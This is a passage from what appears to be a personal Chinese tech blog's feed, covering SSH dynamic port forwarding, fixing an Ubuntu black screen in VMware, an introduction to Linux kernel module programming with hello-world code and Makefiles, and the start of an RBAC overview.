user@remote_ip</code>，一个转发示例：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -D 8080 username@host</span><br></pre></td></tr></table></figure><p>该命令让ssh监听本地8080端口，经过8080端口的流量都通过ssh隧道由远程服务器代为请求，从而达到获取被屏蔽资源、隐藏真实身份的目的。</p><p>这个模式对本地和远程转发都有效，它的工作模式和 Shadow Socks 很像，会在本地创建一个 Socks5 代理服务，监听端口 <code>&lt;port&gt;</code>，并将所有请求转发到远程机器上</p><p>动态转发实际上实现了正向代理功能，因此可以用来科学上网。本地转发也可以做正向代理，但要对每一个请求的主机和端口做转发，比较繁琐，实践中不会这么用。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SSH-Port-Forwarding/dynamic-port-forwarding.svg" alt></p><p>图中我们通过 <code>curl -x socks5h://...</code> 来指定使用 Socks5 代理，在机器 A 上请求 <code>ip_c:8000</code> 时，相当于在 B 机器上发起对 <code>ip_c:8000</code> 的请求。</p><hr><ul><li>在我自己的虚拟机和云主机之间实验，有些挺成功的，但也有些失败，比如动态转发这，不知道为啥连上了阿里云的服务器却连不上网，提示连接被重置，有可能是我云端那没有配置好</li><li>其次是远程转发时其实翻了好多次车，一直会把端口弄混，但是有个瑕疵就是远程转发时，我启动自己的flask的web服务，却一直curl不到东西，用http.server却成功了，可能是哪里有问题没有发现把</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VMware-Ubuntu-blackScreen-fix</title>
      <link href="/2020/02/20/VMware-Ubuntu-blackScreen-fix/"/>
      <url>/2020/02/20/VMware-Ubuntu-blackScreen-fix/</url>
      
        <content type="html"><![CDATA[<h1 id="关于VMware虚拟机中，Ubuntu开机黑屏解决若干"><a href="#关于VMware虚拟机中，Ubuntu开机黑屏解决若干" class="headerlink" title="关于VMware虚拟机中，Ubuntu开机黑屏解决若干"></a>关于VMware虚拟机中，Ubuntu开机黑屏解决若干</h1><p>相当于Mark</p><p>没想到，在写系统安全内核模块时，锁屏开出来后，他界面就崩了，我想着重启能解决一切问题，然后重启完他就凉了</p><p>一直在冒一个白色的光标，心想着继续重启看看有没提示</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">piix4_smbus:</span>HostSMBuscontrollernotenabled</span><br></pre></td></tr></table></figure><p>然后再启动一行时看见这个，搜索解决办法</p><p>但是网上都是大同小异的办法——进入终端，禁用模块</p><p>但是我没有终端啊</p><p>最后查到开机时一直按shift可以进入一个选择启动界面，类似windows的bios</p><p>进去后就可以选择恢复模式，以root身份进入</p><blockquote><p><a href="https://blog.csdn.net/jays_/article/details/80848666" target="_blank" rel="noopener">https://blog.csdn.net/jays_/article/details/80848666</a></p><p><a href="https://www.cnblogs.com/elixforever/p/4924492.html" target="_blank" rel="noopener">https://www.cnblogs.com/elixforever/p/4924492.html</a></p></blockquote><p>然而解决完再次重启，却还是黑屏，虽然少了那一行，但我已经知道了，这不是关键问题</p><blockquote><p><a href="https://blog.csdn.net/what_about_us/article/details/81207926" target="_blank" rel="noopener">https://blog.csdn.net/what_about_us/article/details/81207926</a></p></blockquote><p>然后就想着以黑屏的方式直接搜解决办法，然后就看到上面这个链接有着综合的解释，便学着他mark下来</p><p>尝试了其中的办法，发现原来真的是图形界面崩了，按住<code>crtl+alt+F2~6</code>可以进入tty2~6，也就是无图形化终端</p><p>想着我下午也同时开过vmware和wegame，然后把vmware给暂停了，搜出来这种情况有可能是LSP问题</p><blockquote><p><a href="https://www.cnblogs.com/zhang-yawei/p/12071970.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhang-yawei/p/12071970.html</a></p><p>​        虚拟机和主机之间的通信，基本上是以 socket 的方式进行通信的（这里的 socket 泛指一切 socket，包括本地的、网络的等等）；</p><p>　　某个程序通过 LSP 给系统的 TCP/IP stack 注入了自己的 DLL，如果程序退出时，没有把这个 DLL 收回来，或者回收失败、没有彻底回收等，那么这个 DLL 残留的东西影响了整个 TCP/IP stack，而且是永久性的。<br>　　每个 socket 收发的数据包是要经过 TCP/IP stack 的，这个 DLL 可能会对这些 socket 的数据包做了些什么操作（比如修改数据、直接丢弃等等），然后所以你的虚拟机就黑屏了……<br>　　<code>netsh winsock reset</code>这条命令会重置，所以那些被注入的 DLL 就被清理掉了，所以一切都是最初的模样了……</p></blockquote><p>但是我用这个命令重启之后，以为他能恢复原样，但是他没有！</p><p>用tty1的startx进入黑屏，然后他就没法动了，我们进tty2的<code>ps -ef</code>查看进程，发现都是正常的啊</p><p><img src="https://magic-king.net/images/loading.gif" data-original="VMware-Ubuntu-blackScreen-fix/1.png" alt></p><p>可见gnome正常运行啊</p><blockquote><p><a href="https://askubuntu.com/questions/999180/16-04-to-17-10-login-loop-because-of-xsession-and-upstart" target="_blank" rel="noopener">https://askubuntu.com/questions/999180/16-04-to-17-10-login-loop-because-of-xsession-and-upstart</a></p></blockquote><p>果然还是google靠谱，找到了一个方法，让我看到了桌面，不过又报了下面这行错误</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">could <span class="keyword">not</span> <span class="built_in">set</span> <span class="keyword">the</span> configuration <span class="keyword">for</span> CRTC <span class="number">63</span></span><br></pre></td></tr></table></figure><p>然后没有搜到解决办法，太晚了，先睡</p><hr><p>我们还是从正常方式去debug吧，既然是图形化界面崩了，就去找gnome的错误日志</p><p>不过之前调中文还得先搞英文来，太难了</p><blockquote><p><a href="https://wiki.ubuntu.org.cn/修改locale" target="_blank" rel="noopener">https://wiki.ubuntu.org.cn/%E4%BF%AE%E6%94%B9locale</a></p></blockquote><p>调完之后，去<code>/var/log</code>下查看日志</p><p>太多且太杂了，准备清空日志，重新复现错误</p><blockquote><p>清空日志：<a href="https://www.cnblogs.com/Jimmy1988/p/8892483.html" target="_blank" rel="noopener">https://www.cnblogs.com/Jimmy1988/p/8892483.html</a></p></blockquote><p>找到疑似的几个错误，注意10:51:02是正常启动完系统进入tty1的时间</p><p><img src="https://magic-king.net/images/loading.gif" data-original="VMware-Ubuntu-blackScreen-fix/2.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="VMware-Ubuntu-blackScreen-fix/3.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="VMware-Ubuntu-blackScreen-fix/4.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="VMware-Ubuntu-blackScreen-fix/5.png" alt></p><p>后面全是主题解析错误，也就是无法打开桌面</p><p>但是根据第二张图的日志中lightdm.service一直在重启失败</p><blockquote><p>LightDM：Light Display Manager，是一个轻量级linux桌面显示管理器</p><p><a href="https://baike.baidu.com/item/LightDM/9557430?fr=aladdin" target="_blank" rel="noopener">LightDM_百度百科</a></p></blockquote><p>我们看下服务状态</p><p><img src="https://magic-king.net/images/loading.gif" data-original="VMware-Ubuntu-blackScreen-fix/6.png" alt></p><p>然后发现服务启动过后，卡在了莫名其妙的地方</p><p><img src="https://magic-king.net/images/loading.gif" data-original="VMware-Ubuntu-blackScreen-fix/7.png" alt></p><p>想要更新软件包试试</p><p>然后发现还没网</p><blockquote><p><a href="https://blog.csdn.net/zhu334974857/article/details/77198545" target="_blank" rel="noopener">https://blog.csdn.net/zhu334974857/article/details/77198545</a></p><p><a href="https://www.geek-share.com/detail/2706261264.html" target="_blank" rel="noopener">https://www.geek-share.com/detail/2706261264.html</a></p></blockquote><p>然后发现应该是dns的问题</p><p>然后更新软件包之后，我竟然看到了久违的桌面了</p><p>应该就是软件包有相互不兼容的情况导致lightdm启动失败</p><p>重装ubuntu桌面，然后有了循环登陆错误</p><p>看了下别人的解决办法，没有相符的，大多都是与N卡驱动不兼容，卸载N卡驱动然后重装，结果我想着这思路，前面解决办法中新装了一个<code>unity</code>，我直接<code>apt remove unity</code>然后就进去了woc</p><p>终于把这个ubuntu搞好了，果然没有重装解决不了的问题，唯一不好的就是我用的ubuntu16.04一不小心升级成了ubuntu.18.04，不过心情倍爽儿</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核编程入门</title>
      <link href="/2020/02/20/Linux-Kernel-Coding-Introdution/"/>
      <url>/2020/02/20/Linux-Kernel-Coding-Introdution/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-内核编程入门-amp-简介"><a href="#Linux-内核编程入门-amp-简介" class="headerlink" title="Linux 内核编程入门&amp;简介"></a>Linux 内核编程入门&amp;简介</h1><blockquote><p>Linux可加载内核模块是 Linux 内核的最重要创新之一。它们提供了可伸缩的、动态的内核。其它开发者可以不用重新编译整个内核便可以开发内核层的程序，极大方便了驱动程序等的开发速度。</p></blockquote><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/tigerjibo/article/details/6010997" target="_blank" rel="noopener">小白学Linux之内核模块编程</a></p><p><a href="https://blog.csdn.net/qq_15437667/article/details/69490325" target="_blank" rel="noopener">linux内核编程</a></p><p><a href="https://linux.cn/article-3251-1.html" target="_blank" rel="noopener">黑客内核：编写属于你的第一个Linux内核模块</a></p><p><a href="https://www.cnblogs.com/MYSQLZOUQI/p/5318809.html" target="_blank" rel="noopener">linux mod相关命令&amp;内核模块化</a></p><p><a href="https://www.cnblogs.com/bitor/p/9608725.html" target="_blank" rel="noopener">linux内核编程入门 hello world</a></p></blockquote><p>由于系统安全这门课刚上来，就给了一个内核编程的实例，我不得不找些资料学习学习</p><ul><li>什么是内核模块：内核模块是具有独立功能的程序。它可以被单独编译，但是不能单独运行，它的运行必须被链接到内核作为内核的一部分在内核空间中运行。模块编程和内核版本密切相连，因为不同的内核版本中某些函数的函数名会有变化（所以我在编译老师给的实例时报错了），因此模块编程也可以说是内核编程。</li></ul><blockquote><p><a href="https://lxr.missinglinkelectronics.com/linux：这个网址里可以查到所需用的linux内核函数所在位置" target="_blank" rel="noopener">https://lxr.missinglinkelectronics.com/linux：这个网址里可以查到所需用的linux内核函数所在位置</a></p><p>当然，也可以在linux源码下找到，可能比较慢：<a href="https://github.com/torvalds/linux（github，search" target="_blank" rel="noopener">https://github.com/torvalds/linux（github，search</a> this repository）</p></blockquote><ul><li>内核模块编程<strong>特点</strong>： 模块本身不被编译进内核映像，从而控制了内核的大小；模块一旦被加载，就和内核中的其他部分完全一样。</li></ul><blockquote><p>Linux驱动程序有两种加载方式：一种是静态地编译进内核，内核启动时自动加载，另一种是编写为内核/驱动模块，使用insmod命令将模块动态加载到正在运行的内核，不需要时用rmmod命令将模块卸载。</p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Kernel-Coding-Introdution/1.jpg" alt></p><p>上图为linux内核加载过程</p><h4 id="用户层编程和内核模块编程的区别"><a href="#用户层编程和内核模块编程的区别" class="headerlink" title="用户层编程和内核模块编程的区别"></a>用户层编程和内核模块编程的区别</h4><table><thead><tr><th></th><th>应用程序</th><th>内核模块程序</th></tr></thead><tbody><tr><td>使用函数</td><td>libc库</td><td>内核函数</td></tr><tr><td>运行空间</td><td>用户空间</td><td>内核空间</td></tr><tr><td>运行权限</td><td>普通用户</td><td>超级用户(superuser)</td></tr><tr><td>入口函数</td><td>main()</td><td>module_init()</td></tr><tr><td>出口函数</td><td>exit()</td><td>module_exit()</td></tr><tr><td>编译</td><td>gcc</td><td>makefile</td></tr><tr><td>链接</td><td>gcc</td><td>insmod</td></tr><tr><td>运行</td><td>直接运行生成的./a.out</td><td>insmod</td></tr><tr><td>调试</td><td>gdb</td><td>kdbug、kdb、kgdb</td></tr></tbody></table><h3 id="内核编程：Hello-World"><a href="#内核编程：Hello-World" class="headerlink" title="内核编程：Hello World"></a>内核编程：Hello World</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//模块许可证声明,必须</span></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//模块加载函数,必须</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">"Hello Kernel!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//模块卸载函数,必须</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">4printk(KERN_ALERT <span class="string">"goodbye,kernel/n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//模块的注册</span></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下可选</span></span><br><span class="line"><span class="comment">//声明模块的作者</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">"Magic"</span>);</span><br><span class="line"><span class="comment">//声明模块的描述</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"This is a simple example!/n"</span>);</span><br><span class="line"><span class="comment">//声明模块的别名</span></span><br><span class="line">MODULE_ALIAS(<span class="string">"A simplest example"</span>);</span><br><span class="line"><span class="comment">//声明模块的版本</span></span><br><span class="line">MODULE_VERSION(<span class="string">"version_string"</span>);</span><br><span class="line"><span class="comment">//声明设备表,对于USB,PCI等设备驱动,通常会创建一个</span></span><br><span class="line">MODULE_DEVICE_TABLE(<span class="string">"table_info"</span>);</span><br></pre></td></tr></table></figure><p>在内核编程时，与往常应用编程时类似而又有所不同</p><p>开头为内核编程所必须的三个头文件</p><p>最明显的就是函数入口由<code>main()</code>变成了<code>module_init</code>，又或者像下面直接写出<code>init_module()</code></p><p>在内核编程中，<code>module_init(begin_func);</code>是指定<code>begin_func</code>为该模块的入口，而相对应的<code>module_exit(exit_func)</code>指定了模块退出时的出口函数为<code>exit_func</code>，这两者皆为模块加载函数</p><ul><li>模块加载函数，这部分是必须的。模块加载函数必须以<code>module_init(func)</code>的形式被指定。它返回整形值，<strong>若初始化成功，应返回0</strong>。在上面那个例子当中，<code>hello_init()</code>函数就是模块加载函数需要执行的，主要是打印一条信息。</li><li>跟模块加载函数相对应的就是模块卸载函数，这部分也是必须的。模块卸载函数在模块卸载的时候执行，<strong>不返回任何值</strong>，必须以<code>module_exit(func)</code>的形式来指定。在上面的例子中，<code>hello_exit()</code>函数就是模块卸载函数需要执行的，只要是打印了一条退出信息。</li></ul><ul><li>模块许可证声明，这部分是必须有的。模块许可证（LICENSE）声明描述内核模块的许可权限，<strong>如果不声明LICENSE，模块被加载时，将收到内核被污染（kernel tainted）的警告</strong>。大多数情况下，内核模块应遵守GPL兼容许可权。Linux2.6内核模块最常见的是以<code>MODULE_LICENSE（&quot;Dual BSD/GPL&quot;)</code>语句声明模块采用BSD/GPL双LICENSE。</li></ul><p>再者，其中的函数有所不同，比如<code>printk()</code>是由内核定义的，把要打印的信息输入到系统日志中，可以用<code>dmesg</code>命令查看</p><p>>&gt;&gt;此外，模块加载函数有另外一种写法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//init</span></span><br><span class="line">    printk(<span class="string">"hello tiger/n"</span>);</span><br><span class="line">4<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">exit</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//exit code</span></span><br><span class="line">4printk(<span class="string">"bye bye!/n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种写法与前面不同，就是加了<code>__init</code>和<code>__exit</code>前缀，与第一种写法来说，会比较节省内存</p><blockquote><p><code>__init</code> 和 <code>__exit</code> 是 Linux 内核的一个宏定义，使系统<strong>在初始化完成后释放该函数，并释放其所占内存</strong>。</p><p>在 linux 内核中，<strong>所有标示为 init 的函数在连接的时候都放在 .init.text 这个区段内</strong>，此外，所有的 init 函数在区段 .initcall.init 中还保存了一份<strong>函数指针</strong>，在初始化时内核会通过这些函数指针调用这些 <code>__init</code> 函数，并在初始化完成后释放 init 区段（包括 .init.text,.initcall.init 等）。</p><p><code>__exit</code>和 <code>__init</code> 一样， <code>__exit</code> 也可以使对应函数在运行完成后自动回收内存。</p></blockquote><p>之后，编写完C文件之后就要对其进行相对应的操作，把他编译成内核文件。</p><p>要知道不同环境下，内核版本不一样的可能性极高，再考虑到路径等问题，为了编译方便，一般都采用Makefile的文件形式，来简化内核版本号、路径、以及编写模块的路径和信息</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">obj-m += hello.o</span><br><span class="line"><span class="comment">#generate the path</span></span><br><span class="line">CURRENT_PATH:=<span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="comment">#the current kernel version number</span></span><br><span class="line">LINUX_KERNEL:=<span class="variable">$(<span class="built_in">shell</span> uname -r)</span></span><br><span class="line"><span class="comment">#the absolute path</span></span><br><span class="line">LINUX_KERNEL_PATH:=/usr/src/linux-headers-<span class="variable">$(LINUX_KERNEL)</span></span><br><span class="line"><span class="comment">#complie object</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="comment">#clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure><p>这是老师给的样例，还会打印现有的所有进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/task.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">()</span></span>&#123;</span><br><span class="line">   printk(<span class="string">"Hello world\n"</span>);</span><br><span class="line">   <span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">volatile</span> jiffies;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span> = &amp;<span class="title">init_task</span>;</span></span><br><span class="line">   <span class="keyword">do</span>&#123;</span><br><span class="line">44printk(<span class="string">"%d %s\n"</span>, p-&gt;pid, p-&gt;comm);</span><br><span class="line">       p = next_task(p);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span> (p!=&amp;init_task);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">()</span></span>&#123;</span><br><span class="line">4printk(<span class="string">"bye\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br></pre></td></tr></table></figure><p>以及其简单的Makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj-m := hellops.o</span><br><span class="line">KDIR := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">4<span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> SUBDIRS=<span class="variable">$(PWD)</span> modules</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Kernel-Coding-Introdution/1.png" alt></p><p>运行结果如上</p><blockquote><p>一些常用的linux内核函数：<a href="https://blog.csdn.net/guowenyan001/article/details/43342301" target="_blank" rel="noopener">https://blog.csdn.net/guowenyan001/article/details/43342301</a></p></blockquote><h3 id="内核模块的操作"><a href="#内核模块的操作" class="headerlink" title="内核模块的操作"></a>内核模块的操作</h3><p>编写好内核模块的函数之后，经过编译，我们就得到了所要的内核模块的执行文件<code>xxx.ko</code></p><p>以下就是我们可以对这个文件操纵的一些命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ insmod xxx.ko <span class="comment">#将模块装入内核种</span></span><br><span class="line">$ rmmod xxx.ko <span class="comment">#将模块从内核种删除</span></span><br><span class="line">$ lsmod | grep xxx <span class="comment">#列表显示所有的内核模块，类似ls命令</span></span><br><span class="line">$ modprobe -v xxx.ko <span class="comment">#自动处理载入模块，一般用于载入指定的个别模块或一组相依赖的模块</span></span><br><span class="line">$ depmod /PATH/TO/MODULES_DIR <span class="comment">#查看模块依赖</span></span><br><span class="line">$ modinfo <span class="comment">#查看模块的具体信息</span></span><br></pre></td></tr></table></figure><p>modprobe: modprobe可载入指定的个别模块，或是载入一组相依赖的模块。modprobe会根据depmod所产生的依赖关系，决定要载入哪些模块。若在载入过程中发生错误，在modprobe会卸载整组的模块。依赖关系是通过读取 /lib/modules/2.6.xx/modules.dep得到的。而该文件是通过depmod 所建立。</p><blockquote><p>关于modprobe的相关</p><p><a href="https://www.cnblogs.com/lh03061238/p/11206711.html" target="_blank" rel="noopener">模块加载——modprobe和insmod的区别(转)</a></p><p><a href="https://blog.csdn.net/qianyizhou17/article/details/44135133" target="_blank" rel="noopener">Linux下使用modprobe加载驱动</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Role-Based-Access-Control</title>
      <link href="/2020/02/19/Role-Based-Access-Control/"/>
      <url>/2020/02/19/Role-Based-Access-Control/</url>
      
        <content type="html"><![CDATA[<h1 id="Role-Based-Access-Control"><a href="#Role-Based-Access-Control" class="headerlink" title="Role Based Access Control"></a><center>Role Based Access Control</center></h1><blockquote><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/91898362" target="_blank" rel="noopener">Spring Security 实战干货： RBAC权限控制概念的理解</a></p><p><a href="https://csrc.nist.gov/CSRC/media/Projects/Role-Based-Access-Control/documents/sandhu96.pdf" target="_blank" rel="noopener">Role-Based-Access-Control__sandhu96.pdf</a></p><p><a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/overview" target="_blank" rel="noopener">什么是 Azure 资源的基于角色的访问控制 (RBAC)?</a></p><p><a href="https://csrc.nist.gov/projects/role-based-access-control" target="_blank" rel="noopener">Role Based Access Control</a></p></blockquote><hr><h3 id="RBAC的简介"><a href="#RBAC的简介" class="headerlink" title="RBAC的简介"></a>RBAC的简介</h3><ul><li>RBAC：Role Based Access Control：基于角色的访问控制</li></ul><p>RBAC的概念起源于早期的多用户计算机系统，他的兴起是因为人们需要通用的多用途的可定制工具</p><p>RBAC简化了权限管理，与用户组的概念相近</p><p>RBAC支持三个著名的安全性原则：最少特权、权限分离、数据抽象</p><blockquote><ul><li>最小特权原则，只有该角色完成任务所需的权利被赋予该角色</li><li>职责分离原则，确保互斥角色来完成一项敏感任务，例如比赛中，裁判不能同时是参赛选手</li><li>数据抽象原则，权利依靠抽象完成，例如借记卡和信用卡对于一个账户，而不是用操作系统提供的读写执行的权利</li></ul></blockquote><p>对于RBAC，简单来说，就是将用户对应一个身份，而一个身份拥有相应的权限，如下图所示</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Role-Based-Access-Control/1.jpg" alt></p><p>就如同公司的项目经理，人事经理，上到CEO，CTO等等，每个职位有着相应的权限，而且在每个公司的CTO可以拥有不同的权限，同时CTO也可以由不同人来担任。把这个关系映射到计算机系统来，就是基于角色的访问控制。</p><p>相较于直接将权限分配给用户，这种RBAC的机制有着较强的扩展性，也便于权限管理：在权限更改时，无需遍历所有用户，增加了提权的效率，以及降低了漏调权限的概率，这样用户和资源权限解除了耦合性，这就是 <strong>RBAC</strong> 模型的优势所在。</p><h3 id="RBAC的分类"><a href="#RBAC的分类" class="headerlink" title="RBAC的分类"></a>RBAC的分类</h3><p><strong>RBAC模型</strong>可以分为：<strong>RBAC0</strong>，<strong>RBAC1</strong>，<strong>RBAC2</strong>，<strong>RBAC3</strong> 四种。其中<strong>RBAC0为基础</strong>，其他都是因RBAC为基础的变种。其中他们的关系可以由下图所示。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Role-Based-Access-Control/2.png" alt="Relationship among RBAC models"></p><p>RBAC0是最低层的基本模型。RBAC1和RBAC2都包含的RBAC0的所有特征，并且在此基础上添加了一些独立的功能，同时也被称为advanced models</p><p>RBAC1相较于RBAC0添加了角色继承的概念，即角色可以从其他角色中继承权限，感觉有点类似面向对象中类的继承</p><p>RBAC2添加了一些限定条件，简单来说就是为了职责分离，防止既是参赛选手又是裁判的情况出现</p><p>RBAC3合并了RBAC1和RBAC2，由于传递性，肯定也包含了RBAC0的特征</p><p>RBAC模型的基本特征由下图所示</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Role-Based-Access-Control/3.png" alt></p><h4 id="RBAC0-——Base-model"><a href="#RBAC0-——Base-model" class="headerlink" title="RBAC0 ——Base model"></a>RBAC<sub>0</sub> ——Base 